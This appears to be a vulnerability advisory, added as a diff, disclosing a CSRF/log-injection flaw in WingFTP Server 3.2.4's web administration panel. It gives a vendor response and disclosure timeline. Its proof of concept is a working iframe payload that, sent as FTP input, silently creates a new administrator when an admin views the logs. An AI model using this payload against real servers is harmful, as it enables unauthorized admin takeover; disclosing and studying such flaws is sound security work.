@@ -1,0 +1,49 @@
+
+ Application: WingFTP Server 3.2.4 (maybe earlier versions too)
+ Link: http://www.wftpserver.com/
+ Vulnerability: CSRF
+ Author: Ams
+ Contact: 
+  mail: ax330d [at] gmail [dot] com
+  site: http://www.0x416d73.name/
+
+1. About software
+
+ "Wing FTP server is not only a FTP server. It's a multi-protocol file server(FTP,
+ HTTP, FTPS, HTTPS, SFTP) for Windows, Linux, Mac, freeBSD and Solaris. It
+ includes a new set of advanced tools (web based remote control, web based
+ client, administrator console, task scheduler). It provides event manager for the
+ program to respond to different events, scripts support let users extend the server
+ by Lua language, virtual directories for easy sharing files and directories, and more ... "
+
+2. Vulnerability details
+
+ Wing FTP server web based administration panel provides option to view logs. 
+ We can watch logs by opening 
+   [Domains -> your.domain -> Logs & Status -> Domain Log (or Activity)]
+ These logs are opened directly from file to ajax'ed tag <div>. So, everything 
+ that we send to ftp-server appears on the screen of browser. Without any 
+ filtering. That's why we are capable of exploiting this bug.
+
+3. Proof of concept
+
+  Actually, via this CRSF we can do all things administrator can do from his
+  control panel. The following exploit creates new administrator.
+
+ To show the work of exploit you have to do the following:
+   1. Connect to remote ftp server
+   2. Send this string:
+     <iframe src='http://127.0.0.1:5466/admin_addadmin.html?admin={"username":"Ams","password":"pwnpwnpwn","oldpassword":"","readonly":0,"ipmasks":[]}' width='0' height='0' border='0'></iframe>
+   3. When administrator logins and opens log new administrator is created
+   4. Login as admin 'Ams' and password 'pwnpwnpwn' (if you have not changed them)
+
+4. Vendor response
+
+ Wing FTP Server team has fixed bugs and released new version - Wing FTP Server 3.2.8.
+
+5. Disclosure timeline
+
+ 25/12/2009 - Vendor informed
+ 26/12/2009 - Received response
+ 30/12/2010 - Bug fixed by vendor
+ 31/12/2010 - Public release of advisory
